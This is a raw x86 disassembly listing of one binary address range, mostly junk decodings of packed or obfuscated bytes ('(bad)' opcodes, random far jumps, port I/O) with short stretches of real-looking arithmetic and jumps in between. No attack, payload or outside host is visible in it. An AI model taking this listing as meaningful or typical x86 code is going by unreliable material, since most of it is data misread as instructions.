  40c0fd:	cmp    cl,BYTE PTR [esp+ebx*1-0x74378178]
  40c104:	scas   eax,DWORD PTR es:[edi]
  40c105:	or     bl,BYTE PTR [ebx]
  40c107:	xchg   ebx,eax
  40c108:	mov    ecx,0x97748ef1
  40c10d:	xor    esi,DWORD PTR [ebx-0x4d]
  40c110:	and    BYTE PTR ds:0x402352ed,0xfa
  40c117:	shl    bl,1
  40c119:	sub    al,0x4c
  40c11b:	enter  0xdf92,0x2f
  40c11f:	out    dx,al
  40c120:	cmp    BYTE PTR [eax+eiz*2-0xe],0x44
  40c125:	sub    al,0xb3
  40c127:	xchg   edx,eax
  40c128:	dec    ecx
  40c129:	in     eax,dx
  40c12a:	dec    edx
  40c12b:	sub    BYTE PTR [eax+0x5d797be5],bh
  40c131:	cmp    al,0xd7
  40c133:	xor    edx,esi
  40c135:	retf   0xf434
  40c138:	sub    ebx,DWORD PTR [eax-0x60]
  40c13b:	lahf   
  40c13c:	lods   al,BYTE PTR ds:[esi]
  40c13d:	pop    ecx
  40c13e:	or     edx,DWORD PTR [edx]
  40c140:	call   0xcbb5fa8d
  40c145:	imul   ax,WORD PTR [ecx],0xa019
  40c14a:	jnp    0x40c105
  40c14c:	jbe    0x40c189
  40c14e:	dec    ebx
  40c14f:	pop    es
  40c150:	push   0x17
  40c152:	mov    al,ds:0xa5ea5d5e
  40c157:	repz repnz iret 
  40c15a:	or     dl,BYTE PTR [esp+eax*1]
  40c15d:	add    eax,0x2bd18b4f
  40c162:	ror    BYTE PTR [ebx+0x758be445],1
  40c168:	call   0x417f56
  40c16d:	add    dl,bh
  40c16f:	imul   eax,DWORD PTR [ecx+0x1c],0xffffffd1
  40c173:	ds (bad) 
  40c175:	out    dx,eax
  40c176:	cli    
  40c177:	push   0xbeb43307
  40c17c:	popa   
  40c17d:	cmp    BYTE PTR [esi+edi*2+0x0],dl
  40c181:	add    BYTE PTR [ebp+0x41000000],ah
  40c187:	test   BYTE PTR [ebp-0x5b],0x4d
  40c18b:	or     al,0xce
  40c18d:	stc    
  40c18e:	xchg   ebp,eax
  40c18f:	fidivr DWORD PTR [ebx+0x10a190f6]
  40c195:	cwde   
  40c196:	dec    ecx
  40c197:	mov    dh,0xed
  40c199:	jb     0x40c1da
  40c19b:	std    
  40c19c:	int    0x25
  40c19e:	jnp    0x40c1f9
  40c1a0:	mov    bh,0x4c
  40c1a2:	test   eax,0x640768d7
  40c1a7:	fld    DWORD PTR [eax+ecx*1]
  40c1aa:	icebp  
  40c1ab:	outs   dx,DWORD PTR ds:[esi]
  40c1ac:	pop    es
  40c1ad:	fs jl  0x40c157
  40c1b0:	test   DWORD PTR [esi-0xcd04ba0],esi
  40c1b6:	aad    0xff
  40c1b8:	push   cs
  40c1b9:	cmc    
  40c1ba:	inc    esp
  40c1bb:	dec    edi
  40c1bc:	test   BYTE PTR ds:0x8d793e5f,0xd9
  40c1c3:	inc    edi
  40c1c4:	xlat   BYTE PTR ds:[ebx]
  40c1c5:	sub    al,0x82
  40c1c7:	sub    bh,BYTE PTR [esi+0x1e24d9dd]
  40c1cd:	or     eax,0xb8ed9457
  40c1d2:	(bad)  
  40c1d3:	into   
  40c1d4:	jns    0x40c1b2
  40c1d6:	shl    DWORD PTR [esi],1
  40c1d8:	in     eax,0x65
  40c1da:	xchg   ebx,eax
  40c1db:	jne    0x40c169
  40c1dd:	add    DWORD PTR [edx],ebp
  40c1df:	xchg   edx,eax
  40c1e0:	lock jp 0x40c20c
  40c1e3:	hlt    
  40c1e4:	xchg   edi,esi
  40c1e6:	aam    0xfc
  40c1e8:	xchg   ebp,eax
  40c1e9:	mov    ds:0x7fe648f2,al
  40c1ee:	and    DWORD PTR [esi],edx
  40c1f0:	scas   al,BYTE PTR es:[edi]
  40c1f1:	cs in  eax,dx
  40c1f3:	cmp    eax,0x400dfd7a
  40c1f8:	xchg   ebx,eax
  40c1f9:	xchg   edx,eax
  40c1fa:	mov    ebp,0x1f9b152e
  40c1ff:	out    0x92,al
  40c201:	pusha  
  40c202:	add    al,BYTE PTR [edi]
  40c204:	ss pop es
  40c206:	sub    BYTE PTR [ebp-0x6e],bh
  40c209:	dec    ebp
  40c20a:	sbb    esi,DWORD PTR [edi+0x55]
  40c20d:	xor    BYTE PTR [edx-0x55],dl
  40c210:	cmp    eax,0x8414e547
  40c215:	or     ebp,DWORD PTR [ebp+eax*4+0x63bb2e8c]
  40c21c:	and    eax,0xcbfaaffc
  40c221:	jl     0x40c1db
  40c223:	test   al,0xe5
  40c225:	test   eax,0x5b0a111c
  40c22b:	imul   eax,eax,0x76ef
  40c231:	and    eax,esi
  40c233:	mov    esi,DWORD PTR [ebp-0x14]
  40c236:	sub    eax,esi
  40c238:	mov    esi,DWORD PTR [ebp-0x10]
  40c23b:	or     eax,esi
  40c23d:	mov    esi,DWORD PTR ds:0x4331b4
  40c243:	jmp    0x40c305
  40c248:	inc    edi
  40c249:	push   ss
  40c24a:	rcl    al,1
  40c24c:	rcl    esi,1
  40c24e:	inc    edi
  40c24f:	xchg   edi,eax
  40c250:	pop    edi
  40c251:	ds (bad) 
  40c253:	in     al,0x6d
  40c255:	cmp    DWORD PTR [ecx],eax
  40c257:	gs stc 
  40c259:	jle    0x40c25b
  40c25b:	add    BYTE PTR [ebp+0x53000000],ah
  40c261:	ds pop ds
  40c263:	dec    ecx
  40c264:	jp     0x40c22c
  40c266:	push   es
  40c267:	int3   
  40c268:	dec    esi
  40c269:	pop    ss
  40c26a:	push   0xe0400bb7
  40c26f:	scas   eax,DWORD PTR es:[edi]
  40c270:	pop    ebx
  40c271:	sbb    DWORD PTR [ebx],0xc9736724
  40c277:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c278:	mov    dl,0x59
  40c27a:	ror    bl,0x2a
  40c27d:	sahf   
  40c27e:	sub    DWORD PTR [edx-0x4446956f],ecx
  40c284:	adc    al,0x43
  40c286:	rcl    DWORD PTR [eax+0x4f3f2fea],0x53
  40c28d:	in     eax,dx
  40c28e:	std    
  40c28f:	fcom   DWORD PTR [ebx]
  40c291:	shr    DWORD PTR [ecx+eax*8+0x28],cl
  40c295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c296:	lds    edi,FWORD PTR [edi-0x24]
  40c299:	pop    ss
  40c29a:	inc    ecx
  40c29b:	ins    BYTE PTR es:[edi],dx
  40c29c:	xchg   ebp,eax
  40c29d:	sbb    DWORD PTR [esi-0x6444b027],edx
  40c2a3:	rol    BYTE PTR [edi-0xb],cl
  40c2a6:	cli    
  40c2a7:	(bad)  
  40c2a8:	jns    0x40c30f
  40c2aa:	lahf   
  40c2ab:	ficomp DWORD PTR [edx-0x71]
  40c2ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2af:	add    al,0x66
  40c2b1:	(bad)  
  40c2b2:	cmp    al,0x90
  40c2b4:	inc    bp
  40c2b6:	push   edi
  40c2b7:	mov    ebp,0x1f3cba02
  40c2bc:	repz jmp 0xeb9d:0x80e90556
  40c2c4:	jne    0x40c25e
  40c2c6:	xchg   esi,eax
  40c2c7:	pop    ecx
  40c2c8:	mov    bl,0xc9
  40c2ca:	test   eax,0xa2e15dbe
  40c2cf:	inc    eax
  40c2d0:	jmp    0x17cf:0x78b92fd2
  40c2d7:	xchg   esi,eax
  40c2d8:	mov    ebp,0x419ffc52
  40c2dd:	(bad)  
  40c2df:	loopne 0x40c27a
  40c2e1:	push   ecx
  40c2e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2e3:	push   ecx
  40c2e4:	int3   
  40c2e5:	mov    al,ds:0xd43a66e6
  40c2ea:	jmp    0x23fe07b6
  40c2ef:	pusha  
  40c2f0:	jns    0x40c2fd
  40c2f2:	dec    edi
  40c2f3:	cmc    
  40c2f4:	jl     0x40c2f5
  40c2f6:	mov    ds:0x1fbe1acb,al
  40c2fb:	mov    WORD PTR [ecx-0x2da33640],ss
  40c301:	fdiv   st(3),st
  40c303:	xchg   BYTE PTR [ebx+0x1c0b68b],al
  40c309:	add    BYTE PTR [eax],al
  40c30b:	jmp    0x40c3cd
  40c310:	dec    ebp
  40c311:	nop
  40c312:	cmc    
  40c313:	inc    ecx
  40c314:	std    
  40c315:	gs std 
  40c317:	pushf  
  40c318:	in     eax,dx
  40c319:	in     eax,dx
  40c31a:	fld    TBYTE PTR [ecx+0x42]
  40c31d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c31e:	dec    edx
  40c31f:	or     eax,0x7f9e
  40c324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c325:	add    BYTE PTR [eax],al
  40c327:	add    BYTE PTR [edi+0x6b],dh
  40c32a:	add    DWORD PTR [edi+0x66],ebx
  40c32d:	scas   al,BYTE PTR es:[edi]
  40c32e:	inc    eax
  40c32f:	mov    dh,0x4c
  40c331:	outs   dx,DWORD PTR ds:[esi]
  40c332:	jbe    0x40c33f
  40c334:	out    0xca,eax
  40c336:	dec    edx
  40c337:	inc    eax
  40c338:	jecxz  0x40c2dd
  40c33a:	mov    esi,0xf2ebd886
  40c33f:	pop    ss
  40c340:	inc    ebx
  40c341:	jle    0x40c3b2
  40c343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c344:	sbb    eax,DWORD PTR [edi+0x60]
  40c347:	jne    0x40c398
  40c349:	sub    ecx,DWORD PTR [esi+0x1fe92d3e]
  40c34f:	lea    ebp,[ebp+0x390970d6]
  40c355:	popa   
  40c356:	int    0x42
  40c358:	in     eax,0x60
  40c35a:	and    al,0xf
  40c35c:	dec    esi
  40c35d:	cmp    eax,0x1c8d27a6
  40c362:	in     al,dx
  40c363:	sti    
  40c364:	push   cs
  40c365:	mov    ds:0x925f2d67,al
  40c36a:	sub    al,0x33
  40c36c:	push   es
  40c36d:	(bad)  
  40c36f:	es in  eax,0x36
  40c372:	jge    0x40c36b
  40c374:	add    ebx,DWORD PTR [eax-0x63]
  40c377:	and    ch,bl
  40c379:	xchg   ebp,eax
  40c37a:	push   ss
  40c37b:	add    eax,0xb6e8b477
  40c380:	out    dx,al
  40c381:	icebp  
  40c382:	scas   eax,DWORD PTR es:[edi]
  40c383:	stos   DWORD PTR es:[edi],eax
  40c384:	pop    edi
  40c385:	mov    ch,0xa8
  40c387:	out    0x21,al
  40c389:	mov    eax,ds:0xf28d796b
  40c38e:	adc    bh,0x7a
  40c391:	xchg   ebp,eax
  40c392:	jmp    0xea08:0xe080b5a4
  40c399:	shr    ecx,1
  40c39b:	rcr    BYTE PTR [esi+0x1d],1
  40c39e:	in     al,dx
  40c39f:	sub    al,0x13
  40c3a1:	jmp    0x95bca513
  40c3a6:	loopne 0x40c3c2
  40c3a8:	pop    ds
  40c3a9:	ror    BYTE PTR ds:0xc7ae823b,cl
  40c3af:	test   al,0x5
  40c3b1:	jae    0x40c34d
  40c3b3:	or     al,BYTE PTR [ecx-0x5aee7071]
  40c3b9:	fisub  DWORD PTR [edx-0x547a2f66]
  40c3bf:	outs   dx,BYTE PTR ds:[esi]
  40c3c0:	in     al,dx
  40c3c1:	popa   
  40c3c2:	aad    0xde
  40c3c4:	xchg   DWORD PTR [esi],esi
  40c3c6:	adc    eax,0x1c89b1e3
  40c3cb:	call   0xea30ef9d
  40c3d0:	mov    ebp,0x6c000000
  40c3d5:	jne    0x40c3b7
  40c3d7:	int    0xf9
  40c3d9:	(bad)  [ebp-0xb]
  40c3dc:	sub    BYTE PTR [eax+0x16e05f04],ah
  40c3e2:	ret    0x4392
  40c3e5:	add    BYTE PTR [eax],0x0
  40c3e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3e9:	add    BYTE PTR [eax],al
  40c3eb:	add    BYTE PTR [ebp-0x48dce378],dl
  40c3f1:	hlt    
  40c3f2:	jnp    0x40c3b2
  40c3f4:	push   ss
  40c3f5:	jl     0x40c388
  40c3f7:	jbe    0x40c3bb
  40c3f9:	int    0x12
  40c3fb:	stos   DWORD PTR es:[edi],eax
  40c3fc:	into   
  40c3fd:	je     0x40c421
  40c3ff:	or     BYTE PTR [edi+0x59],bl
  40c402:	jb     0x40c3e9
  40c404:	cmp    BYTE PTR [ebp+0x1e],ah
  40c407:	push   0x8c61131
  40c40c:	jge    0x40c455
  40c40e:	into   
  40c40f:	and    dl,dh
  40c411:	cmp    edx,edi
  40c413:	ins    DWORD PTR es:[edi],dx
  40c414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c415:	sub    DWORD PTR [edi],eax
  40c417:	add    DWORD PTR [esi+0x1b],ebx
  40c41a:	pop    ecx
  40c41b:	sub    DWORD PTR [esi],edi
  40c41d:	sbb    al,0xf
  40c41f:	xor    al,0x93
  40c421:	mov    edi,0x98e5bade
  40c426:	in     eax,dx
  40c427:	mov    ds:0x7fce0a86,al
  40c42c:	jnp    0x40c3f8
  40c42e:	xchg   esi,eax
  40c42f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c430:	retf   0x3798
  40c433:	loop   0x40c444
  40c435:	imul   edx,DWORD PTR [esi-0x57],0xc8dbe5a4
  40c43c:	cmovle esi,eax
  40c43f:	dec    dh
  40c441:	inc    ebx
  40c442:	rcr    esi,1
  40c444:	xor    ah,al
  40c446:	jge    0x40c421
  40c448:	jb     0x40c4c0
  40c44a:	inc    esi
  40c44b:	aad    0x4e
  40c44d:	inc    esi
  40c44e:	(bad)  
  40c44f:	out    0x86,eax
  40c451:	lea    esi,[edx+0x42]
  40c454:	arpl   WORD PTR ds:0xbd97d578,cx
  40c45a:	cdq    
  40c45b:	mov    eax,0x52d693ea
  40c460:	dec    eax
  40c461:	fmul   DWORD PTR [ebp+0x50]
  40c464:	jge    0x40c4c0
  40c466:	push   ebx
  40c467:	push   ds
  40c468:	les    eax,FWORD PTR [eax-0x82b1dd]
  40c46e:	add    DWORD PTR [ebx+ebx*2],0x17373a99
  40c475:	out    0xf3,al
  40c477:	inc    edi
  40c478:	inc    ebp
  40c479:	out    dx,eax
  40c47a:	jmp    0x30f9f00b
  40c47f:	or     eax,DWORD PTR [ecx+0x4a]
  40c482:	data16 sub al,0x6
  40c485:	jp     0x40c4f2
  40c487:	push   es
  40c488:	lds    edx,FWORD PTR ds:0x67b0522d
  40c48e:	dec    edx
  40c48f:	add    ch,ch
  40c491:	mov    eax,DWORD PTR [ebp+0xc]
  40c494:	jmp    0x40c556
  40c499:	and    ah,dl
  40c49b:	jnp    0x40c432
  40c49d:	(bad)  
  40c49e:	mov    edi,0x6143f5ee
  40c4a3:	cli    
  40c4a4:	pop    edi
  40c4a5:	push   cs
  40c4a6:	pop    esp
  40c4a7:	(bad)  
  40c4a9:	call   0xa540c52e
  40c4ae:	add    BYTE PTR [eax],al
  40c4b0:	add    BYTE PTR [edi+edx*4],al
  40c4b3:	push   ecx
  40c4b4:	mov    esp,edi
  40c4b6:	sub    dh,BYTE PTR [edi+esi*8+0x101e6f31]
  40c4bd:	push   gs
  40c4bf:	fs pop ecx
  40c4c1:	jb     0x40c4d9
  40c4c3:	add    bh,BYTE PTR [ebx]
  40c4c5:	xor    esi,DWORD PTR [ecx]
  40c4c7:	sub    esp,DWORD PTR [edx+0x6ea5a253]
  40c4cd:	pop    esi
  40c4ce:	mov    esi,DWORD PTR [eax+0x764a03a5]
  40c4d4:	ja     0x40c537
  40c4d6:	mov    ebx,0xd18c12b6
  40c4db:	not    BYTE PTR [ecx]
  40c4dd:	repnz sbb edx,DWORD PTR [esi]
  40c4e0:	mov    ah,0x36
  40c4e2:	(bad)  
  40c4e3:	push   ss
  40c4e4:	aam    0x5e
  40c4e6:	jno    0x40c476
  40c4e8:	push   esp
  40c4e9:	sub    eax,0xc1111622
  40c4ee:	push   es
  40c4ef:	mov    esi,0x2ebbc322
  40c4f4:	mov    esi,0xbf3b01e
  40c4f9:	stos   DWORD PTR es:[edi],eax
  40c4fa:	push   esp
  40c4fb:	jnp    0x40c4e9
  40c4fd:	fiadd  DWORD PTR [edi+0xb]
  40c500:	and    DWORD PTR [esi],0xfa543b20
  40c506:	mov    edi,0xc464e548
  40c50b:	rcl    bh,0x7c
  40c50e:	pushf  
  40c50f:	mov    ebp,0xbd079f89
  40c514:	xchg   edi,eax
  40c515:	jecxz  0x40c51e
  40c517:	lods   eax,DWORD PTR ds:[esi]
  40c518:	jmp    0x40c576
  40c51a:	ficom  WORD PTR [ebx]
  40c51c:	cmp    DWORD PTR [ebx],ebp
  40c51e:	add    esp,edi
  40c520:	push   edi
  40c521:	mov    eax,0xdcc2e41d
  40c526:	fs mov esp,0x1f7da02e
  40c52c:	add    eax,0xcf9ac43f
  40c531:	jmp    0x40c594
  40c533:	not    BYTE PTR [ebx-0x2a]
  40c536:	iret   
  40c537:	xor    ebp,DWORD PTR [edx+esi*8-0x6d0c865]
  40c53e:	icebp  
  40c53f:	push   ds
  40c540:	imul   ecx,edi,0xffffffef
  40c543:	sub    ch,BYTE PTR [edx-0x25dc8f64]
  40c549:	jmp    0x44ba8308
  40c54e:	ja     0x40c52f
  40c550:	in     eax,dx
  40c551:	adc    edx,edi
  40c553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c554:	mov    edx,0x2848a96
  40c559:	mov    BYTE PTR ds:0x84880000,bl
  40c55f:	push   cs
  40c560:	cmp    eax,0x8b000051
  40c565:	inc    ebp
  40c566:	hlt    
  40c567:	mov    edx,DWORD PTR [ebp-0x8]
  40c56a:	xor    eax,0x3304
  40c56f:	add    eax,0x2f28
  40c574:	imul   eax,eax,0x4904
  40c57a:	jmp    0x40c63c
  40c57f:	mov    es,WORD PTR [edi]
  40c581:	sbb    al,0x43
  40c583:	popf   
  40c584:	pop    ebx
  40c585:	(bad)  
  40c587:	jge    0x40c5a4
  40c589:	stos   BYTE PTR es:[edi],al
  40c58a:	xchg   ebp,eax
  40c58b:	in     al,dx
  40c58c:	mov    edx,0x818d5ff2
  40c591:	add    BYTE PTR [eax],al
  40c593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c594:	add    BYTE PTR [eax],al
  40c596:	add    BYTE PTR [edx+0x7d],bl
  40c599:	daa    
  40c59a:	loope  0x40c5ce
  40c59c:	out    dx,eax
  40c59d:	ror    esi,0x6e
  40c5a0:	dec    esp
  40c5a1:	ret    0xa4f7
  40c5a4:	rol    BYTE PTR [ebp-0x3],0xd5
  40c5a8:	and    edi,DWORD PTR ds:0x4086179
  40c5ae:	lea    edx,[ebx+0x7f]
  40c5b1:	xchg   edi,eax
  40c5b2:	add    eax,0x66d72a97
  40c5b7:	rol    ecx,cl
  40c5b9:	sub    BYTE PTR [edi+0x79],0x41
  40c5bd:	fwait
  40c5be:	pushf  
  40c5bf:	adc    DWORD PTR [edx-0x6fc4e1fa],esi
  40c5c5:	retf   
  40c5c6:	xchg   edi,eax
  40c5c7:	imul   ecx,edx,0x4d4eecea
  40c5cd:	jo     0x40c605
  40c5cf:	dec    eax
  40c5d0:	nop
  40c5d1:	in     al,dx
  40c5d2:	loopne 0x40c56d
  40c5d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5d5:	lahf   
  40c5d6:	or     edx,DWORD PTR [eax]
  40c5d8:	xchg   ebx,eax
  40c5d9:	leave  
  40c5da:	rdpmc  
  40c5dc:	xor    al,0x3a
  40c5de:	fidivr WORD PTR [ebx]
  40c5e0:	mov    al,0xc4
  40c5e2:	js     0x40c61a
  40c5e4:	cwde   
  40c5e5:	mov    BYTE PTR [ecx+0x1d],dh
  40c5e8:	and    eax,0x310b0ef5
  40c5ed:	out    dx,eax
  40c5ee:	sub    al,bh
  40c5f0:	mov    ebp,0xea0f8eec
  40c5f5:	cmp    eax,DWORD PTR [edx+0x2c]
  40c5f8:	das    
  40c5f9:	sub    esp,DWORD PTR [edx-0x29d20efc]
  40c5ff:	daa    
  40c600:	jmp    0x40c66c
  40c602:	in     eax,dx
  40c603:	in     al,dx
  40c604:	mov    dh,0x4d
  40c606:	ins    BYTE PTR es:[edi],dx
  40c607:	test   al,0xb1
  40c609:	mov    esp,0x1e0b803a
  40c60e:	mov    ecx,0x12d6f439
  40c613:	sbb    DWORD PTR [ebp+0x37],edx
  40c616:	int3   
  40c617:	ret    
  40c618:	sbb    eax,0x38c5888a
  40c61d:	popf   
  40c61e:	and    al,0x9b
  40c620:	lock or edi,DWORD PTR fs:[edi]
  40c624:	xor    al,0x4b
  40c626:	ins    DWORD PTR es:[edi],dx
  40c627:	or     al,0x7e
  40c629:	call   0x5bb2:0xeedea5d0
  40c630:	in     eax,dx
  40c631:	adc    eax,0xb0e1e19d
  40c636:	(bad)  [ebx+0x4274f0b6]
  40c63c:	and    eax,edx
  40c63e:	lea    ecx,[ecx+eax*1-0xbf]
  40c645:	mov    eax,DWORD PTR [ebp-0x4]
  40c648:	mov    edx,DWORD PTR [ebp-0x28]
  40c64b:	or     eax,edx
  40c64d:	mov    edx,DWORD PTR [ebp-0x2c]
  40c650:	and    eax,edx
  40c652:	mov    edx,DWORD PTR [ebp-0x30]
  40c655:	jmp    0x40c717
  40c65a:	jge    0x40c611
  40c65c:	js     0x40c6c5
  40c65e:	clc    
  40c65f:	out    dx,eax
  40c660:	jg     0x40c621
  40c662:	adc    esp,ebx
  40c664:	imul   eax,ebx,0x69409939
  40c66a:	xor    al,BYTE PTR [edx+0xa50000]
  40c670:	add    BYTE PTR [eax],al
  40c672:	cmp    eax,0x4de514ae
  40c677:	retf   0xb1da
  40c67a:	cmp    al,0xc1
  40c67c:	push   ebx
  40c67d:	jg     0x40c67b
  40c67f:	mov    es,WORD PTR [edi+0x44114741]
  40c685:	mov    esi,0xf689f577
  40c68a:	div    DWORD PTR [ebx+0x685ae581]
  40c690:	test   eax,0x6cda4b91
  40c695:	lods   al,BYTE PTR ds:[esi]
  40c696:	pop    ecx
  40c697:	fstp   DWORD PTR [eax-0x9]
  40c69a:	test   BYTE PTR [edi],ah
  40c69c:	dec    edx
  40c69d:	adc    DWORD PTR [ecx],ebp
  40c69f:	leave  
  40c6a0:	int    0x94
  40c6a2:	pop    ebx
  40c6a3:	sub    eax,0x802d8820
  40c6a8:	inc    edx
  40c6a9:	dec    ebp
  40c6aa:	int    0x58
  40c6ac:	and    bh,dl
  40c6ae:	call   0xe94c:0x95221077
  40c6b5:	into   
  40c6b6:	xchg   ecx,eax
  40c6b7:	add    eax,DWORD PTR [ecx]
  40c6b9:	mov    BYTE PTR [ebx-0x6],bh
  40c6bc:	xchg   esp,eax
  40c6bd:	pop    ds
  40c6be:	lods   eax,DWORD PTR ds:[esi]
  40c6bf:	rol    DWORD PTR [ebp-0x3eda10ce],0x7b
  40c6c6:	retf   0x8180
  40c6c9:	or     al,0xa
  40c6cb:	jnp    0x40c72c
  40c6cd:	gs nop
  40c6cf:	sub    bh,BYTE PTR [ecx]
  40c6d1:	mov    ?,ebx
  40c6d3:	xchg   ebp,eax
  40c6d4:	mov    ebx,DWORD PTR [edx+edx*2-0x63d454a]
  40c6db:	(bad)  
  40c6dc:	xchg   esp,eax
  40c6dd:	mov    DWORD PTR [edi-0x70d267c3],esp
  40c6e3:	push   ss
  40c6e4:	add    eax,0xf5b83750
  40c6e9:	lahf   
  40c6ea:	add    BYTE PTR [ebp-0x68bcf34e],ah
  40c6f0:	out    dx,al
  40c6f1:	jnp    0x40c6ad
  40c6f3:	or     edx,DWORD PTR [edi]
  40c6f5:	push   es
  40c6f6:	jmp    0x5830:0x87a5ff89
  40c6fd:	sbb    cl,al
  40c6ff:	scas   al,BYTE PTR es:[edi]
  40c700:	mov    edi,DWORD PTR [esi]
  40c702:	or     eax,0x4f5003ac
  40c707:	test   edx,ebx
  40c709:	leave  
  40c70a:	stc    
  40c70b:	fs cmp al,0x86
  40c70e:	mov    ah,0xd7
  40c710:	mov    cl,0x8a
  40c712:	jmp    0x40c6d9
  40c714:	nop
  40c715:	or     BYTE PTR [esi+0xdcc758b],0x24
  40c71c:	push   0xc2330000
  40c721:	xor    edx,edx
  40c723:	jmp    0x40c7e5
  40c728:	adc    DWORD PTR [ebp+ebp*4-0x19],ebx
  40c72c:	in     eax,dx
  40c72d:	neg    DWORD PTR [ebx-0x2]
  40c730:	cmp    edi,eax
  40c732:	push   ebp
  40c733:	lahf   
  40c734:	out    dx,al
  40c735:	mov    ds:0x82d7bc9f,eax
  40c73a:	add    BYTE PTR [eax],al
  40c73c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c73d:	add    BYTE PTR [eax],al
  40c73f:	add    BYTE PTR [ebx+0x20fa30b],ah
  40c745:	je     0x40c6c9
  40c747:	jmp    0x40c7b8
  40c749:	add    BYTE PTR [ebx+ebp*4-0x13],al
  40c74d:	dec    esi
  40c74e:	(bad)  
  40c74f:	loopne 0x40c7b3
  40c751:	pop    es
  40c752:	in     eax,dx
  40c753:	nop
  40c754:	pop    es
  40c755:	and    eax,DWORD PTR [edi+0x535f9dcb]
  40c75b:	xchg   ebx,eax
  40c75c:	push   es
  40c75d:	mov    eax,0xe0c19c0b
  40c762:	add    ebp,DWORD PTR [ebp+0x2ee4ed58]
  40c768:	xor    al,0x57
  40c76a:	mov    al,ds:0xa2209533
  40c76f:	and    DWORD PTR [ebp-0x3c1071c2],0x68657941
  40c779:	mov    bl,BYTE PTR [ecx]
  40c77b:	sub    BYTE PTR [ebx+0x1acd6756],al
  40c781:	clc    
  40c782:	es sti 
  40c784:	das    
  40c785:	mov    ds:0x71a01a50,eax
  40c78a:	out    dx,eax
  40c78b:	add    eax,0xb9056f0a
  40c790:	loopne 0x40c76b
  40c792:	adc    BYTE PTR [ecx-0x2a],cl
  40c795:	dec    ebp
  40c796:	adc    esp,DWORD PTR [edx-0x41]
  40c799:	adc    al,0xce
  40c79b:	call   FWORD PTR [ebx+ecx*1]
  40c79e:	call   0x99582e9c
  40c7a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7a4:	mov    WORD PTR [edx+0x9],cs
  40c7a7:	jno    0x40c7bd
  40c7a9:	mov    bl,ch
  40c7ab:	retf   
  40c7ac:	and    ebx,0x23
  40c7af:	jle    0x40c7b1
  40c7b1:	xor    BYTE PTR [bx+si],ah
  40c7b4:	xchg   ebp,eax
  40c7b5:	out    dx,al
  40c7b6:	mov    ch,0x8
  40c7b8:	jg     0x40c828
  40c7ba:	stc    
  40c7bb:	pop    ebx
  40c7bc:	and    edi,eax
  40c7be:	inc    esp
  40c7bf:	dec    esi
  40c7c0:	cwde   
  40c7c1:	pop    ss
  40c7c2:	xchg   ebx,eax
  40c7c3:	std    
  40c7c4:	call   0xc590c5f7
  40c7c9:	pushf  
  40c7ca:	sub    DWORD PTR [esi+0x73],0xd107244f
  40c7d1:	or     BYTE PTR [ebx+0x441234bd],bl
  40c7d7:	outs   dx,DWORD PTR ds:[esi]
  40c7d8:	inc    ebx
  40c7d9:	add    dh,dl
  40c7db:	mov    bh,0xc7
  40c7dd:	mov    ds:0xe32b13e3,al
  40c7e2:	ds sub esi,esp
  40c7e5:	div    esi
  40c7e7:	add    eax,0x285f
  40c7ec:	jmp    0x40c8ae
  40c7f1:	lods   eax,DWORD PTR ds:[esi]
  40c7f2:	test   al,0x24
  40c7f4:	mov    al,ds:0xadadac25
  40c7f9:	gs jmp 0x40c7d1
  40c7fc:	xchg   ebp,eax
  40c7fd:	push   es
  40c7fe:	sbb    BYTE PTR [esi-0x71],bl
  40c801:	jl     0x40c786
  40c803:	add    BYTE PTR [eax],al
  40c805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c806:	add    BYTE PTR [eax],al
  40c808:	add    BYTE PTR [ecx+0x7eee187a],bh
  40c80e:	jnp    0x586ae623
  40c814:	and    DWORD PTR [edi+0x4e04116b],edx
  40c81a:	mov    edi,?
  40c81c:	jo     0x40c856
  40c81e:	adc    esi,DWORD PTR [ebx-0x7edb152f]
  40c824:	mov    dl,0xbd
  40c826:	jb     0x40c858
  40c828:	retf   0xeb49
  40c82b:	pusha  
  40c82c:	adc    eax,esp
  40c82e:	sbb    BYTE PTR [ebp+0x439aba8f],ch
  40c834:	sub    edx,ebx
  40c836:	iret   
  40c837:	hlt    
  40c838:	in     al,dx
  40c839:	shr    DWORD PTR [eax+0x2ed6e2c7],0x59
  40c840:	aad    0x48
  40c842:	mov    bl,0x5f
  40c844:	cdq    
  40c845:	mov    cl,0xb4
  40c847:	test   bh,ch
  40c849:	gs in  al,dx
  40c84b:	jecxz  0x40c88a
  40c84d:	push   edx
  40c84e:	nop
  40c84f:	leave  
  40c850:	mov    cl,0xa0
  40c852:	or     ecx,0x6eb6e272
  40c858:	mul    dh
  40c85a:	in     eax,dx
  40c85b:	adc    edx,ebx
  40c85d:	jmp    0x40c8cc
  40c85f:	adc    dl,al
  40c861:	cli    
  40c862:	xor    DWORD PTR ds:0xa4881953,esi
  40c868:	push   esi
  40c869:	inc    edi
  40c86a:	cmp    BYTE PTR [eax+0x2a573a72],0x5f
  40c871:	inc    edi
  40c872:	es mov esp,0x3f574ebd
  40c878:	jmp    0xa488:0x1519f732
  40c87f:	sub    eax,0x45df286d
  40c884:	(bad)  
  40c885:	loopne 0x40c876
  40c887:	iret   
  40c888:	push   es
  40c889:	fstp   TBYTE PTR [ecx]
  40c88b:	inc    eax
  40c88c:	call   0x8cf6:0xe551f84c
  40c893:	ret    
  40c894:	(bad)  
  40c895:	in     al,0x47
  40c897:	dec    esi
  40c898:	shl    DWORD PTR [ecx+0x36],1
  40c89b:	mov    ebp,0x28650253
  40c8a0:	xor    DWORD PTR [eax-0x61],ebx
  40c8a3:	imul   esp,DWORD PTR [ecx],0xf854a54c
  40c8a9:	(bad)  
  40c8aa:	adc    ah,ch
